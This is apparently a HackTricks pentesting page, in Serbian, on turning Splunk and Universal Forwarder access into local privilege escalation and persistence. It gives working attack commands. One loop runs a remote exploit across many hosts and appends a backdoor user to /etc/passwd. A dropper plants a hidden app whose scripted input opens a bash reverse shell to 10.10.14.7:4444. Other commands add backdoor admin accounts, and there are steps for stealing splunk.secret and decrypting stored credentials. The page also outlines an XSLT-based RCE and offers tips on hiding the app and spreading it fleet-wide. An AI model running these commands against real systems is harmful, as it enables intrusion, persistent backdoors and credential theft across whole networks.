# Splunk LPE i Persistence

{{#include ../../banners/hacktricks-training.md}}

Ako tokom **enumerating** mašine, bilo **interno** ili **eksterno**, pronađete da je **Splunk pokrenut** (obično **8000** za web UI i **8089** za management API), validni kredencijali se često mogu pretvoriti u **code execution** putem instalacije aplikacija, scripted inputs ili management radnji. Ako Splunk radi kao **root**, to često odmah dovodi do **privilege escalation**.

Ako vam je potrebna samo generička površina za daljinski napad, enumeracija ili RCE putanja putem otpremanja aplikacije, pogledajte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ako ste **već root** i Splunk servis ne osluškuje samo na localhost-u, možete takođe ukrasti **Splunk password hashes**, povratiti **encrypted secrets** ili postaviti **malicious app** radi održavanja persistence-a lokalno ili na više forwarder-a.

## Zanimljive lokalne datoteke

Kada dobijete pristup hostu na kojem rade Splunk ili Splunk Universal Forwarder, sledeće putanje su obično najzanimljivije:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Važni artefakti:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni Splunk korisnici i hash-evi lozinki.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ključ koji Splunk koristi za šifrovanje secrets sačuvanih u nekoliko `.conf` fajlova.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: početni admin bootstrap fajl; koristan kod gold image-ova i grešaka pri provisioning-u. Ignoriše se ako `etc/passwd` već postoji.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mesto na kojem se scripted inputs obično omogućavaju.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ili **`$SPLUNK_HOME/etc/apps/`**: dobra mesta za skrivanje persistent app-a ili proveru onoga što se već distribuira.

## Splunk Universal Forwarder Agent Exploit Summary

Za dodatne detalje pogledajte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:

**Pregled exploit-a:**
Exploit koji cilja Splunk Universal Forwarder (UF) omogućava attacker-ima sa **agent password-om** da izvrše proizvoljan kod na sistemima na kojima agent radi, potencijalno kompromitujući veliki deo okruženja.

**Zašto funkcioniše:**

- UF management service je često izložen na **TCP 8089**.
- Attackers mogu da se autentifikuju na API i nalože forwarder-u da instalira **malicious app bundle**.
- Isti primitive može da se koristi lokalno za **LPE** ili udaljeno za **RCE**.
- Javno dostupni alati, kao što je **SplunkWhisperer2**, automatski kreiraju app bundle i mogu da prilagode payload-e za Linux targets.

**Uobičajeni načini za pronalaženje password-a:**

- Credentials u čistom tekstu u dokumentaciji, skriptama, share-ovima ili deployment automation-u.
- Password hash-evi unutar `$SPLUNK_HOME/etc/passwd`, nakon čega sledi offline cracking.
- Golden image-ovi ili ostaci provisioning-a, kao što je `user-seed.conf`.

**Uticaj:**

- Izvršavanje koda sa SYSTEM/root nivoom na svakom kompromitovanom hostu.
- Deploy-ovanje persistent app-ova, backdoor-a ili ransomware-a.
- Onemogućavanje ili manipulisanje telemetry podacima pre njihovog prosleđivanja.

**Primer command-a za exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Javno dostupni exploiti:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence putem Scripted Inputs ili Malicious Apps

Ako imate **write access nad filesystemom** kao `root`/`splunk`, ili autentifikovani pristup za instaliranje apps, veoma pouzdan mehanizam persistence-a je postavljanje **custom app-a** sa **scripted input-om**. Splunk-ova dokumentacija očekuje da se scripted inputs nalaze u direktorijumu app-a i da budu omogućeni iz `inputs.conf`.

Tipičan raspored:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalni `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Brzi Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Napomene:

- Isti trik funkcioniše na **Universal Forwarder** koristeći `/opt/splunkforwarder/etc/apps/`.
- Attackers se često uklope tako što izmene legitimni add-on umesto da kreiraju očigledno malicious app.
- Na **deployment serveru**, postavljanje malicious app-a unutar `deployment-apps/` pretvara se u **fleet-wide persistence**, jer forwarderi periodično proveravaju, preuzimaju ažurirane app-ove i često se restartuju da bi ih primenili.

## Krađa credentiala i preuzimanje admin naloga

Ako možete da čitate lokalne fajlove Splunk-a, obično postoje dva dobra cilja: oporavak **Splunk admin pristupa** i oporavak **encrypted service credentiala**.

### Password hash-evi i lokalni korisnici

Splunk čuva lokalne authentication podatke u `etc/passwd`. U zavisnosti od deployment-a, cracking te datoteke može da otkrije važeće credentiale za web UI i management API.

Ako već imate važeće **admin** credentiale i Splunk koristi **native** authentication backend, sam CLI može da se koristi za persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i šifrovane vrednosti

Splunk koristi `etc/auth/splunk.secret` za zaštitu osetljivih vrednosti sačuvanih u više konfiguracionih fajlova. Ako možete da ukradete i **secret** i relevantne **`.conf` fajlove**, često možete da povratite ili ponovo upotrebite:

- zajedničke secret vrednosti forwarder/indexer komponenti, kao što je `pass4SymmKey`
- lozinke privatnih TLS ključeva, kao što je `sslPassword`
- LDAP bind kredencijale, kao što je `bindDNPassword`

Ovo je korisno za **lateral movement**, čak i kada sama Splunk admin lozinka ne može da se crack-uje.

### Zloupotreba `user-seed.conf`

`user-seed.conf` se koristi samo prilikom prvog pokretanja ili kada `etc/passwd` ne postoji. Zbog toga je manje koristan na aktivnom sistemu, ali je veoma interesantan u:

- kompromitovanim installation template-ima
- container image-ima
- unattended provisioning workflow-ima
- appliance-ima gde se Splunk automatski ponovo inicijalizuje

U tim slučajevima, postavljanje `HASHED_PASSWORD` vrednosti generisane pomoću `splunk hash-passwd` daje vam tih način da ponovo dobijete admin pristup nakon redeployment-a.

## Zloupotreba Splunk upita

Za dodatne detalje pogledajte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Korisna novija tehnika je zloupotreba **XSLT-a koji dostavlja korisnik** u ranjivim verzijama Splunk Enterprise-a, čime se account sa niskim privilegijama, ali sa autentikacijom, može pretvoriti u **izvršavanje OS komandi** kao korisnik `splunk`.

Tok na visokom nivou:

1. Autentikujte se na Splunk.
2. Uploadujte zlonamerni **XSL** fajl kroz funkcionalnost za preview/upload.
3. Naterajte Splunk da prikaže rezultate pretrage koristeći uploadovani stylesheet iz **dispatch** direktorijuma.
4. Iskoristite XSLT payload za upis fajla ili pokretanje izvršavanja kroz Splunk-ov search pipeline (na primer, pristupanjem internim funkcionalnostima kao što je `runshellscript`).

Važan offensive zaključak je da ovaj put omogućava **post-auth RCE bez potrebe za app upload-om**. Na Linux-u se obično dobija pristup account-u **`splunk`**, što je i dalje vredno jer taj korisnik često poseduje application tree, može da čita secret-e i može da postavi persistent apps koji preživljavaju gubitak shell-a.

Reprezentativna putanja korišćena tokom exploitation-a je:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ako Splunk radi sa previše privilegija ili ako korisnik `splunk` ima pristup opasnim skriptama, servisnim jedinicama sa dozvolom za upis ili nebezbednim `sudo` pravilima, ovo postaje čist **LPE** lanac.

## Reference

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
